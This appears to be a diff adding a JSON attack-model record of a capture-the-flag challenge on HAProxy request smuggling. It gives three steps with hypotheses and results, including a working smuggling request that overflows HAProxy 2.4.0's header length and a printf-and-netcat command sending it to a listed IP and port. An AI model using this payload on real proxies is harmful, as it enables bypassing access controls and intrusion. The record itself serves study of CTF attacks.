@@ -1,0 +1,59 @@
+{
+    "AttackModel": {
+        "NameOfTheChallenge": "HAProxy HTTP Request Smuggling",
+        "AttackerCapabilities": [
+            "Understanding of HTTP request smuggling",
+            "Ability to manipulate HTTP requests",
+            "Knowledge of HAProxy vulnerabilities"
+        ],
+        "Target": {
+            "Type": "Web Application",
+            "Vulnerabilities": [
+                "Case-sensitive configuration of HAProxy",
+                "HTTP request smuggling vulnerability in HAProxy version 2.4.0"
+            ],
+            "SecurityMeasures": [
+                "HAProxy as a reverse proxy",
+                "Case-sensitive validation for /flag endpoint"
+            ]
+        },
+        "Steps": [
+            {
+                "StepNumber": 1,
+                "Description": "Craft a specially constructed HTTP request to exploit the case-sensitive configuration of HAProxy.",
+                "ToolsUsed": null,
+                "StepDetails": {
+                    "Hypothesis": "The attacker hypothesizes that by sending a GET request to /FLAG instead of /flag, they can bypass the case-sensitive validation and access the /flag endpoint.",
+                    "Action": "The attacker sends the following HTTP request: GET /FLAG HTTP/1.1 Host: 128.199.3.34:1235",
+                    "Result": "The attacker receives an HTTP response with the flag in the body.",
+                    "Success": "Success",
+                    "FailingReason": null
+                }
+            },
+            {
+                "StepNumber": 2,
+                "Description": "Exploit the HTTP request smuggling vulnerability in HAProxy version 2.4.0.",
+                "ToolsUsed": null,
+                "StepDetails": {
+                    "Hypothesis": "The attacker hypothesizes that by exploiting the HTTP request smuggling vulnerability in HAProxy version 2.4.0, they can bypass the validation and access the /flag endpoint.",
+                    "Action": "The attacker crafts a specially constructed HTTP request with two Content-Length headers, causing an integer overflow and manipulation of the request routing. The request looks like this:\nPOST /test HTTP/1.1\nHost: 128.199.3.34:1235\nContent-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:\nContent-Length: 26\nGET /flag HTTP/1.1\nDUMMY:GET / HTTP/1.1\nHost: 128.199.3.34:1235",
+                    "Result": "The attacker successfully bypasses the validation and the request is forwarded to the backend with a modified routing, resulting in the response for the /flag endpoint being returned instead of the expected / endpoint.",
+                    "Success": "Success",
+                    "FailingReason": null
+                }
+            },
+            {
+                "StepNumber": 3,
+                "Description": "Send the crafted HTTP request with artificial delays.",
+                "ToolsUsed": "nc (netcat)",
+                "StepDetails": {
+                    "Hypothesis": "The attacker hypothesizes that by adding artificial delays between the consecutive requests, they can ensure the requests are processed correctly.",
+                    "Action": "The attacker sends the crafted HTTP request with artificial delays using the following command:\n(printf \"POST / HTTP/1.1\\r\\n\"\\\n\"Host: 128.199.3.34:1235\\r\\n\"\\\n\"Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:\\r\\n\"\\\n\"Content-Length: 26\\r\\n\\r\\n\"; sleep 1;\\\nprintf \"GET /flag HTTP/1.1\\r\\n\"\\\n\"DUMMY:\"; sleep 1; printf \"GET /test HTTP/1.1\\r\\n\"\\\n\"Host: 128.199.3.34:1235\\r\\n\\r\\n\") | nc 128.199.3.34 1235",
+                    "Result": "The attacker receives an HTTP response with the flag in the body.",
+                    "Success": "Success",
+                    "FailingReason": null
+                }
+            }
+        ]
+    }
+}
